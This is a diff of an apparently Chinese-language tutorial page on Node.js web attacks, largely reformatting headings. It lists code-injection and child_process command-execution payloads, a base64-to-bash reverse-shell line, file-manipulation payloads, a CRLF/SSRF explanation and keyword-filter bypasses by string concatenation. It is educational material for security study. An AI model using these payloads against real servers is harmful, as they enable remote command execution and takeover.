+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>settimeout(function,time)，该函数作用是两秒后执行函数，function 处为我们可控的参数。</p>
 <pre tabindex="0"><code>var express = require(&#34;express&#34;);
 var app = express();
 
@@ -314,8 +339,11 @@ setTimeout(()=&gt;{
 
 var server = app.listen(1234,function(){
     console.log(&#34;应用实例，访问地址为 http://127.0.0.1:1234/&#34;);
-})</code></pre><p>######### setinterval()</p>
-<p>setinterval (function,time)，该函数的作用是每个两秒执行一次代码。</p>
+})</code></pre><h5 id="setinterval" class="heading-element"><span>setinterval()</span>
+  <a href="#setinterval" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>setinterval (function,time)，该函数的作用是每个两秒执行一次代码。</p>
 <pre tabindex="0"><code>var express = require(&#34;express&#34;);
 var app = express();
 
@@ -326,8 +354,11 @@ setInterval(()=&gt;{
 
 var server = app.listen(1234,function(){
     console.log(&#34;应用实例，访问地址为 http://127.0.0.1:1234/&#34;);
-})</code></pre><p>######### function()</p>
-<p>function(string)()，string 是传入的参数，这里的 function 用法类似于 php 里的 create_function。</p>
+})</code></pre><h5 id="function" class="heading-element"><span>function()</span>
+  <a href="#function" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>function(string)()，string 是传入的参数，这里的 function 用法类似于 php 里的 create_function。</p>
 <pre tabindex="0"><code>var express = require(&#34;express&#34;);
 var app = express();
 
@@ -335,25 +366,52 @@ var aaa=Function(&#34;console.log(&#39;Hacked&#39;)&#34;)();
 
 var server = app.listen(1234,function(){
     console.log(&#34;应用实例，访问地址为 http://127.0.0.1:1234/&#34;);
-})</code></pre><p>######## process 模块命令执行</p>
-<p>process 的作用是提供当前 node.js 进程信息并对其进行控制。</p>
+})</code></pre><h4 id="process-模块命令执行" class="heading-element"><span>process 模块命令执行</span>
+  <a href="#process-%e6%a8%a1%e5%9d%97%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>process 的作用是提供当前 node.js 进程信息并对其进行控制。</p>
 <p>chile_process.exec调用的是/bash.sh，它是一个bash解释器，可以执行系统命令。</p>
 <pre tabindex="0"><code>child_process.execSync(command[, options])</code></pre><p>直接给出playload：</p>
-<pre tabindex="0"><code>?eval=require(&#39;child_process&#39;).execSync(ls /)</code></pre><p>######### <strong>exec</strong></p>
-<pre tabindex="0"><code>require(&#39;child_process&#39;).exec(&#39;calc&#39;);</code></pre><p>######### execSync</p>
-<pre tabindex="0"><code>require(&#39;child_process&#39;).execSync(&#39;ls /&#39;).toString()</code></pre><p>######### <strong>execFile</strong></p>
-<pre tabindex="0"><code>require(&#39;child_process&#39;).execFile(&#34;calc&#34;,{shell:true});</code></pre><p>######### <strong>fork</strong></p>
-<pre tabindex="0"><code>require(&#39;child_process&#39;).fork(&#34;./hacker.js&#34;);</code></pre><p>######### <strong>spawn</strong></p>
-<p>spawn() 启动一个子进程 来执行命令 spawn(命令,{shell:true})</p>
-<pre tabindex="0"><code>require(&#39;child_process&#39;).spawn(&#34;calc&#34;,{shell:true});</code></pre><p>######### spawnSync</p>
-<pre tabindex="0"><code>require( &#39;child_process&#39; ).spawnSync( &#39;ls&#39;, [ &#39;/&#39; ] ).stdout.toString()</code></pre><p>######### 反弹shell</p>
-<pre tabindex="0"><code>require(&#39;child_process&#39;).exec(&#39;echo SHELL_BASE_64|base64 -d|bash&#39;);
+<pre tabindex="0"><code>?eval=require(&#39;child_process&#39;).execSync(ls /)</code></pre><h5 id="exec" class="heading-element"><span><strong>exec</strong></span>
+  <a href="#exec" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><pre tabindex="0"><code>require(&#39;child_process&#39;).exec(&#39;calc&#39;);</code></pre><h5 id="execsync" class="heading-element"><span>execSync</span>
+  <a href="#execsync" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><pre tabindex="0"><code>require(&#39;child_process&#39;).execSync(&#39;ls /&#39;).toString()</code></pre><h5 id="execfile" class="heading-element"><span><strong>execFile</strong></span>
+  <a href="#execfile" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><pre tabindex="0"><code>require(&#39;child_process&#39;).execFile(&#34;calc&#34;,{shell:true});</code></pre><h5 id="fork" class="heading-element"><span><strong>fork</strong></span>
+  <a href="#fork" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><pre tabindex="0"><code>require(&#39;child_process&#39;).fork(&#34;./hacker.js&#34;);</code></pre><h5 id="spawn" class="heading-element"><span><strong>spawn</strong></span>
+  <a href="#spawn" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>spawn() 启动一个子进程 来执行命令 spawn(命令,{shell:true})</p>
+<pre tabindex="0"><code>require(&#39;child_process&#39;).spawn(&#34;calc&#34;,{shell:true});</code></pre><h5 id="spawnsync" class="heading-element"><span>spawnSync</span>
+  <a href="#spawnsync" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><pre tabindex="0"><code>require( &#39;child_process&#39; ).spawnSync( &#39;ls&#39;, [ &#39;/&#39; ] ).stdout.toString()</code></pre><h5 id="反弹shell" class="heading-element"><span>反弹shell</span>
+  <a href="#%e5%8f%8d%e5%bc%b9shell" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><pre tabindex="0"><code>require(&#39;child_process&#39;).exec(&#39;echo SHELL_BASE_64|base64 -d|bash&#39;);
 
 注意：BASE64加密后的字符中有一个+号需要url编码为%2B(一定情况下)</code></pre><blockquote>
 <p>PS：如果上下文中没有require(类似于Code-Breaking 2018 Thejs)，则可以使用<code>global.process.mainModule.constructor._load('child_process').exec('calc')</code>来执行命令</p>
 </blockquote>
-<p>######## 文件操作</p>
-<p>那么在上面 我们已经可以执行我们像执行的代码 了 那么对于文件的操作也是很好实现的</p>
+<h4 id="文件操作" class="heading-element"><span>文件操作</span>
+  <a href="#%e6%96%87%e4%bb%b6%e6%93%8d%e4%bd%9c" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>那么在上面 我们已经可以执行我们像执行的代码 了 那么对于文件的操作也是很好实现的</p>
 <p>操作函数后面有Sync 代表同步方法</p>
 <p>nodejs文件系统模块中的方法均有异步和同步版本 比如读取文件内容的函数有 异步的fs.readFile() 和 同步的 fs.readFileSync()。</p>
 <p>异步的方法函数 最后一个 参数为 回调函数 回调函数的 第一个参数 包含了错误信息</p>
@@ -362,34 +420,34 @@ var server = app.listen(1234,function(){
 <pre tabindex="0"><code>res.end(require(&#39;fs&#39;).readdirSync(&#39;.&#39;).toString())
 res.end(require(&#39;fs&#39;).writeFileSync(&#39;./daigua.txt&#39;,&#39;内容&#39;).toString());
 res.end(require(&#39;fs&#39;).readFileSync(&#39;./daigua.txt&#39;).toString());
-res.end(require(&#39;fs&#39;).rmdirSync(&#39;./daigua&#39;).toString());</code></pre><h5 id="ssrf" class="heading-element"><span>0.0.0.4  SSRF</span>
+res.end(require(&#39;fs&#39;).rmdirSync(&#39;./daigua&#39;).toString());</code></pre><h1 id="ssrf" class="heading-element"><span>SSRF</span>
   <a href="#ssrf" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><h6 id="rn注入" class="heading-element"><span>0.0.0.4.1  \r\n注入</span>
+</h1><h2 id="rn注入" class="heading-element"><span>\r\n注入</span>
   <a href="#rn%e6%b3%a8%e5%85%a5" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>用户发出的http请求通常将请求路径指定为字符串，但Node.js最终必须==将请求作为原始字节输出==。JavaScript支持unicode字符串，因此将它们转换为字节意味着选择并应用适当的unicode编码。对于不包含主体的请求,Node.js默认使用“latin1”，这是一种单字节编码，不能表示高编号的unicode字符。相反，这些字符被截断为其JavaScript表示的最低字节</p>
+</h2><p>用户发出的http请求通常将请求路径指定为字符串，但Node.js最终必须==将请求作为原始字节输出==。JavaScript支持unicode字符串，因此将它们转换为字节意味着选择并应用适当的unicode编码。对于不包含主体的请求,Node.js默认使用“latin1”，这是一种单字节编码，不能表示高编号的unicode字符。相反，这些字符被截断为其JavaScript表示的最低字节</p>
 <p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307301221293.webp" alt="image-20230730122108994" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307301221293.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307301221293.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307301221293.webp?size=large 2x" data-title="image-20230730122108994" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307301221741.webp" alt="image-20230730122127474" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307301221741.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307301221741.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307301221741.webp?size=large 2x" data-title="image-20230730122127474" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<h5 id="sql注入" class="heading-element"><span>0.0.0.5  SQL注入</span>
+<h1 id="sql注入" class="heading-element"><span>SQL注入</span>
   <a href="#sql%e6%b3%a8%e5%85%a5" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><h5 id="vm沙箱逃逸" class="heading-element"><span>0.0.0.6  VM沙箱逃逸</span>
+</h1><h1 id="vm沙箱逃逸" class="heading-element"><span>VM沙箱逃逸</span>
   <a href="#vm%e6%b2%99%e7%ae%b1%e9%80%83%e9%80%b8" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><h5 id="bypass" class="heading-element"><span>0.0.0.7  bypass</span>
+</h1><h1 id="bypass" class="heading-element"><span>bypass</span>
   <a href="#bypass" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><h6 id="字符拼接" class="heading-element"><span>0.0.0.7.1  字符拼接</span>
+</h1><h2 id="字符拼接" class="heading-element"><span>字符拼接</span>
   <a href="#%e5%ad%97%e7%ac%a6%e6%8b%bc%e6%8e%a5" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>原语句</p>
+</h2><p>原语句</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#58a1dd">require</span>(<span style="color:#a6be9d">&#34;child_process&#34;</span>).<span style="color:#58a1dd">execSync</span>(<span style="color:#a6be9d">&#39;calc&#39;</span>)</span></span></code></pre></div><p>变形语句</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#58a1dd">require</span>(<span style="color:#a6be9d">&#34;child_process&#34;</span>)[<span style="color:#a6be9d">&#39;exe&#39;</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">2</span><span style="color:#58a1dd">B</span><span style="color:#a6be9d">&#39;cSync&#39;</span>](<span style="color:#a6be9d">&#39;ls /&#39;</span>)
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">require</span>(<span style="color:#a6be9d">&#34;child_process&#34;</span>)[<span style="color:#a6be9d">&#34;exe&#34;</span>.<span style="color:#58a1dd">concat</span>(<span style="color:#a6be9d">&#34;cSync&#34;</span>)](<span style="color:#a6be9d">&#39;calc&#39;</span>)
